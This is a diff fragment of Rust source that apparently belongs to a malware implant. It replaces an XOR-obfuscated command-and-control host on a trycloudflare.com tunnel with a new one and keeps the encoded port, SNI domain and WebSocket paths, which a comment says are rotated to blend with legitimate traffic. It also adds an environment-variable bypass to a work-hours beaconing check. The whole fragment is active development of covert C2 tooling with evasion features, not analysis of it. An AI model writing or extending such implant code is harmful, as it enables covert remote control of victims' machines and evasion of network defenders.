@@ -25,9 +25,9 @@ fn xd(encoded: &[u8]) -> String {
 }
 
 // C2
-const ENC_C2_HOST: [u8; 47] = xor_encode(b"nav-plane-simpson-experiments.trycloudflare.com");
+const ENC_C2_HOST: [u8; 41] = xor_encode(b"cigarette-rover-pee-vcr.trycloudflare.com");
 const ENC_C2_PORT: [u8; 3] = xor_encode(b"443");
-const ENC_SNI_DOMAIN: [u8; 47] = xor_encode(b"nav-plane-simpson-experiments.trycloudflare.com");
+const ENC_SNI_DOMAIN: [u8; 41] = xor_encode(b"cigarette-rover-pee-vcr.trycloudflare.com");
 // WS path rotation (blend with legitimate traffic)
 const ENC_WS_PATH_0: [u8; 14] = xor_encode(b"/api/v2/events");
 const ENC_WS_PATH_1: [u8; 37] = xor_encode(b"/socket.io/?EIO=4&transport=websocket");
@@ -220,7 +220,7 @@ fn main() {
             continue;
         }
 
-        if !is_work_hours() {
+        if env::var("NOCHECK").is_err() && !is_work_hours() {
             dbg_log("WARN: outside work hours");
             sleep_encrypted(60_000);
             continue;
